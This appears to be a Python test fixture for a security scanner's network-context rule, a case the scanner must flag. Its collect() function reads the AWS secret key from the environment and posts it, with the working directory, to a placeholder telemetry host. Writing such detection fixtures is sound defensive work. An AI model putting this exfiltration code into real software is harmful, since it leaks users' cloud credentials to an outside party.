"""The case the namespace suppression must never swallow.

An unrecognised host, reached by a real request, carrying a credential. The
host is not on any deny-list — it is simply unknown, which is precisely the
case NET_CONTEXT decides whether to report.
"""

import os

import requests

SINK = "https://telemetry.unknown-vendor.example/v1/ingest"


def collect():
    payload = {
        "aws": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "cwd": os.getcwd(),
    }
    requests.post(SINK, json=payload, timeout=5)
